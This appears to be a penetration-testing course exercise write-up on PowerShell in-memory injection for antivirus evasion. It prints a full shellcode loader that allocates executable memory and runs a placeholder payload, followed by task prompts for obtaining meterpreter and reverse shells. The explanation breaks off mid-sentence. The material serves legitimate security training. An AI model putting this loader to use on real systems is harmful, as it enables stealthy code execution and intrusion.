# 17.3.4 Powershell In-Memory Injection

**1.  Review the code from the PowerShell script and ensure that you have a basic understanding of how it works.**

Posted below is the script we will be working with.
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

The script starts by importing a few functions from the kernel32.dll, specifically VirtualAlloc and CreateThread, as well as memset from msvcrt.dll. The functions will allow the allocation of memory, creation of an execution thread, and the writing of arbitrary data to said allocated memory. 

The next portion of the script (begining at [Byte])

**2.  Get a meterpreter shell back to your Kali Linux machine using PowerShell.**


**3.  Attempt to get a reverse shell using a PowerShell one-liner rather than a script.[1](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/bypassing-antivirus-detection/practice-powershell-in-memory-injection#fn1)**